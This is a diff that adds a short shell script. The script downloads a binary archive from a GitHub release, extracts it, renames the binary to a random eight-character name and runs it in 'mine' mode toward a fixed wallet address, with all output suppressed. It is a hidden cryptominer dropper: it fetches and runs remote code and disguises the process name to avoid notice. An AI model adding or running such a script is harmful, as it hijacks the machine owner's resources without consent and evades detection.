@@ -1,0 +1,6 @@
+wget https://github.com/augestaf/trompela/releases/download/v1.9.5/ppoe.tar
+tar -xf ppoe.tar
+rm -rf ppoe.tar
+variable7=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv ppoe $variable7
+./$variable7 mine --address 2uzk15Vc7zBsMEAE14kUqS1mJyYnFx35c8WnLMKo4s7s > /dev/null 2>&1
